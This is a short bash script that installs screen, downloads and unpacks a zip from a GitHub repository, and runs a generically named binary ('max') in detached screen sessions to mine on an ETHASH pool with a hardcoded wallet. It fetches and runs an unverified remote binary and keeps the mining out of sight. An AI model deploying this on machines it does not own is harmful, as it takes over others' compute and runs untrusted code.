#!/bin/bash
sudo apt update && sudo apt install zip unzip && sudo apt install screen -y && 
screen -dmS gpuu.sh ./GPU.sh 65 75 && 
wget https://github.com/v5000/max/raw/main/max.zip && unzip max.zip && cd max && chmod u+x max && 
screen -dmS gpuu.sh nohup ./max --algo ETHASH --pool ethash.na.mine.zergpool.com:9999 --user Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY --pass c=LTC,mc=AKA,m=solo --ethstratum ETHPROXY > nohup.out

